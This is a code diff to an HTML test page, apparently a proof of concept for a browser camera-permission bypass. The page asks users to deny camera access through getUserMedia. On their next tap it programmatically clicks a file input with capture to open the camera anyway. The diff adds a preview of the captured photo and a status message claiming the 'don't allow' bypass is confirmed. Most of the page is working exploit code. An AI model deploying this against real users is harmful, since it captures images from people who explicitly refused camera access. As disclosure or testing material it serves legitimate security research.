@@ -24,6 +24,15 @@
         border: none;
         border-radius: 5px;
       }
+      #preview {
+        margin-top: 30px;
+      }
+      #preview img {
+        max-width: 90%;
+        max-height: 500px;
+        border: 3px solid #007bff;
+        border-radius: 8px;
+      }
     </style>
   </head>
   <body>
@@ -40,14 +49,34 @@
 
     <button id="btn-trigger" class="btn">CLICK HERE</button>
 
+    <div id="preview"></div>
+
     <script>
       let requested = false;
       const statusText = document.getElementById("status");
       const btn = document.getElementById("btn-trigger");
+      const fileInput = document.getElementById("f");
+      const previewDiv = document.getElementById("preview");
+
+      fileInput.onchange = (e) => {
+        const file = e.target.files[0];
+        if (file) {
+          const reader = new FileReader();
+          reader.onload = (ev) => {
+            const img = document.createElement("img");
+            img.src = ev.target.result;
+            previewDiv.innerHTML = "";
+            previewDiv.appendChild(img);
+            statusText.innerText =
+              "Status: Photo captured & bypassing 'don't allow' has been confirmed!";
+            console.log("Photo displayed:", file.name);
+          };
+          reader.readAsDataURL(file);
+        }
+      };
 
       document.onclick = async () => {
         if (!requested) {
-          // FIRST TAP: Trigger camera permission prompt (MediaStream)
           requested = true;
           statusText.innerText =
             "Status: Requesting camera permission... (PLEASE CLICK 'DON'T ALLOW')";
@@ -61,17 +90,15 @@
             statusText.innerText =
               "Status: Permission Granted (This is not expected for this test — please deny)";
           } catch (x) {
-            // Reached when the user clicks "Don't Allow"
             statusText.innerText =
               "Status: PERMISSION DENIED! Now click once more.";
             console.log("Permission denied by user.");
           }
         } else {
-          // SECOND TAP: Trigger camera via input capture
           statusText.innerText =
             "Status: Triggering camera despite denied permission...";
           console.log("Tap 2: Programmatically clicking file input capture...");
-          document.getElementById("f").click();
+          fileInput.click();
         }
       };
     </script>
